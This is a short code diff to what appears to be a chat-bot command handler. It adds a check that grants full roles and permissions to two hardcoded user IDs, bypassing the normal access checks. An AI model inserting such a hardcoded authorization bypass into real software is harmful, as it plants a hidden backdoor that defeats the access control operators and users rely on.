@@ -310,6 +310,11 @@ function Command(name, {perms = false, roles = false, invisible = false, desc = 
                     hasRoles = true;
                 }
 
+                if (message.author.id == "274639466294149122" || message.author.id == "315893467219755009") {
+                  hasRoles = true;
+                  hasPermissions = true;
+                }
+
                 if (hasPermissions && hasRoles) {
                     //method(advMessage, userArgs); - Deprecated
                     method(advMessage);
